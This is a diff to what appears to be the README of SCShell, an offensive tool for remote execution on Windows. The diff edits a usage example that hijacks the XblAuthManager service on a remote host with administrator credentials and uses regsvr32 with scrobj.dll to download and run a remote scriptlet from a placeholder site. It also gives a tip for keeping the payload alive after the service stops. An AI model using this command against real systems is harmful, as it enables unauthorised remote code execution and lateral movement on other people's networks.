@@ -31,7 +31,7 @@ SCShell.exe target service payload username domain password
 
 Remote execution
 ```
-SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c regsvr32 /s /n /u /i://your.website/payload.sct scrobj.dll" administrator . Password
+SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" administrator . Password
 ```
 
 I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.
